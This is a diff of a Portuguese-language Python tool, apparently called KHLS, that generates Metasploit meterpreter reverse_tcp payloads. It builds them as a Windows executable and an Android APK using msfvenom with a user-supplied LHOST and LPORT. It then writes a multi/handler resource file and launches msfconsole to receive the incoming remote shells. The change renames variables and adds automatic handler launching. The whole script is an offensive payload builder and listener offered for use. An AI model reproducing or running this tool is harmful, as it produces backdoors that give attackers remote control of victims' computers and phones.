@@ -2,26 +2,18 @@
 # -*- coding: utf-8 -*-
 
 from os import system
-from subprocess import call
+import subprocess
 
 def Payload_Msfvenon():
     system('\033[36m')
     system('clear')
     system('figlet .. GR - PAYLOAD')
-    a1 = "1"
-    a2 = "2"
-    a3 = ""
-    a4 = ""
-    a5 = ""
-    #i4 = "setterm -foreground yellow -background black -store"
-    #i3 = "setterm -foreground blue -background black -store"
-    #i2 = "setterm -foreground default -background default -store"
-    #i = "setterm -foreground green -background black -store"
-    r = "N"
+    var1 = "1"
+    var2 = "2"
 
-    while r == "N":
-        #call("linux_logo")
-        #system("{}".format(i))
+    permite = "N"
+
+    while permite == "N":
         print("\033[0;0m\033[33m**************************** Autor LAUDIER-ST *************************")
         print("--------------------------   Versao KHLS 1.0  -------------------------\033[0;0m")
         print("#######################################################################")
@@ -33,48 +25,63 @@ def Payload_Msfvenon():
         print("\033[32m\033[1m( 2 )\033[0;0m ANDROID!  \033[32m\033[1m  '$' '$'  '$' '& & &' '$   $' '  \\    \033[0;0m                  ")
         print("\033[32m\033[1m( 3 )\033[0;0m SAIR!     \033[32m\033[1m    '&'    '$' '&  &'  '$ $ $' '$ $ $'  \033[0;0m                 ")
         print("\033[36m%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%\033[0;0m")
-        m = "msfvenom -p windows/meterpreter/reverse_tcp LHOST="
-        p = " LPORT="
-        e = " -f exe > KHLSEXE.exe"
-        a3 = input("\033[35m\033[1mDIGITE COM NUMERO UMA DAS OPÇÕES ACIMA PARA GERAR O SEU PAYLOAD!\033[0;0m\n\033[32m\033[1mDIGITE AQUI: \033[0;0m ")
+        construtor = "msfvenom -p windows/meterpreter/reverse_tcp LHOST="
+        porta1 = " LPORT="
+        estecao = " -f exe > KHLSEXE.exe"
+        var3 = input("\033[35m\033[1mDIGITE COM NUMERO UMA DAS OPÇÕES ACIMA PARA GERAR O SEU PAYLOAD!\033[0;0m\n\033[32m\033[1mDIGITE AQUI: \033[0;0m ")
 
-        m2 = "msfvenom -p android/meterpreter/reverse_tcp LHOST="
-        p2 = " LPORT="
-        e2 = " R > KHLSAPP.apk"
+        mapa2 = "msfvenom -p android/meterpreter/reverse_tcp LHOST="
+        porta = " LPORT="
+        rota = " R > KHLSAPP.apk"
 
-        if a3 == a1:
-            o1 = "mkdir output1 && cd output1 && touch msfconsole-r.rc && echo use multi/handler >> msfconsole-r.rc && echo set payload windows/meterpreter/reverse_tcp >> msfconsole-r.rc && echo set LHOST "
-            o2 = ">> msfconsole-r.rc && echo set LPORT "
-            o3 = ">> msfconsole-r.rc && set ExitOnSession false >> msfconsole-r.rc && echo set EnableStageEncoding true >> msfconsole-r.rc && echo exploit -j >> msfconsole-r.rc"
+        if var3 == var1:
+            cria1 = "mkdir output1 && cd output1 && touch msfconsole-r.rc && echo use multi/handler >> msfconsole-r.rc && echo set payload windows/meterpreter/reverse_tcp >> msfconsole-r.rc && echo set LHOST "
+            cria2 = ">> msfconsole-r.rc && echo set LPORT "
+            cria3 = ">> msfconsole-r.rc && set ExitOnSession false >> msfconsole-r.rc && echo set EnableStageEncoding true >> msfconsole-r.rc && echo exploit -j >> msfconsole-r.rc"
 
-            #system("{}".format(i3))
-            a4 = input("\033[34m"+"\033[1m"+"LHOST: ")
-            a5 = input("LPORT: ")
-            a6 = m + a4 + p + a5 + e
-            o4 = o1 + a4 + o2 + a5 + o3
-            system("{}".format(a6))
-            system("{}".format(o4))
-            #system("{}".format(i4))
-            call("clear")
+            var4 = input("\033[34m"+"\033[1m"+"LHOST: ")
+            var5 = input("LPORT: ")
+            var6 = construtor + var4 + porta1 + var5 + estecao
+            var7 = cria1 + var4 + cria2 + var5 + cria3
+            system("{}".format(var6))
+            system("{}".format(var7))
+            system("clear")
             print("\nSEU PAYLOAD FOI CRIADO! ACESSE O DIRETORIO KHLS/output1/ E LÁ IRÁ TER DOIS ARQUIVOS, KHLSEXE.exe E O  msfconsole-r.rc COM OS COMANDOS PARA EXECULTAR COM METASPLOIT! Agora abra o terminal e digite msfconsole -r msfconsole-r.rc e da enter\n")
+            try:
+                cmd = ['xterm']
+                cmd.extend(['-e', 'bash', '-c', 'mv KHLSEXE.exe -t output1 && cd output1 && nautilus .; exec $SHELL'])
+                subprocess.Popen(cmd, stdout=subprocess.PIPE)
+                system('cd output1 && service postgresql start && msfconsole -r msfconsole-r.rc')
+            except:
+                cr = '='
+                print(cr * 60)
+                print('Algo deu errado')
+                print(cr * 60)
+        elif var3 == var2:
+            zona1 = "mkdir output2 && cd output2 && touch msfconsole-r.rc && echo use multi/handler >> msfconsole-r.rc && echo set payload android/meterpreter/reverse_tcp >> msfconsole-r.rc && echo set LHOST "
+            zona2 = ">> msfconsole-r.rc && echo set LPORT "
+            zona3 = ">> msfconsole-r.rc && set ExitOnSession false >> msfconsole-r.rc && echo set EnableStageEncoding true >> msfconsole-r.rc && echo exploit -j >> msfconsole-r.rc"
 
-        elif a3 == a2:
-            z1 = "mkdir output2 && cd output2 && touch msfconsole-r.rc && echo use multi/handler >> msfconsole-r.rc && echo set payload android/meterpreter/reverse_tcp >> msfconsole-r.rc && echo set LHOST "
-            z2 = ">> msfconsole-r.rc && echo set LPORT "
-            z3 = ">> msfconsole-r.rc && set ExitOnSession false >> msfconsole-r.rc && echo set EnableStageEncoding true >> msfconsole-r.rc && echo exploit -j >> msfconsole-r.rc"
-
-            #os.system("{}".format(i3))
-            a4 = input("\033[34m"+"\033[1m"+"LHOST: ")
-            a5 = input("LPORT: ")
-            a6 = m2 + a4 + p2 + a5 + e2
-            z4 = z1 + a4 + z2 + a5 + z3
-            system("{}".format(a6))
-            system("{}".format(z4))
-            #system("{}".format(i4))
-            call("clear")
+            var4 = input("\033[34m"+"\033[1m"+"LHOST: ")
+            var5 = input("LPORT: ")
+            var6 = mapa2 + var4 + porta + var5 + rota
+            zona4 = zona1 + var4 + zona2 + var5 + zona3
+            system("{}".format(var6))
+            system("{}".format(zona4))
+            system("clear")
             print("\nSEU PAYLOAD FOI CRIADO! ACESSE O DIRETORIO KHLS/output2/ E LÁ IRÁ TER DOIS ARQUIVOS, KHLSAPP.apk E O  msfconsole-r.rc COM OS COMANDOS PARA EXECULTAR COM METASPLOIT! Agora abra o terminal e digite msfconsole -r msfconsole-r.rc e da enter\n")
+            try:
+                cmd = ['xterm']
+                cmd.extend(['-e', 'bash', '-c', 'mv KHLSAPP.apk -t output2 && cd output2 && nautilus .; exec $SHELL'])
+                subprocess.Popen(cmd, stdout=subprocess.PIPE)
+                system('cd output2 && service postgresql start && msfconsole -r msfconsole-r.rc')
+            except:
+                cr = '='
+                print(cr * 60)
+                print('Algo deu errado')
+                print(cr * 60)
         print("=====================================================================")
-        r = input(("\nQUER SAIR DO PROGRAMA? SE SIM (S) SE NÃO (N) ######[S/N]: ")).upper()
+
+        permite = input(("\nQUER SAIR DO PROGRAMA? SE SIM (S) SE NÃO (N) ######[S/N]: ")).upper()
         print("=====================================================================")
-        #os.system("{}".format(i2))
-        call("clear")
+        system("clear")
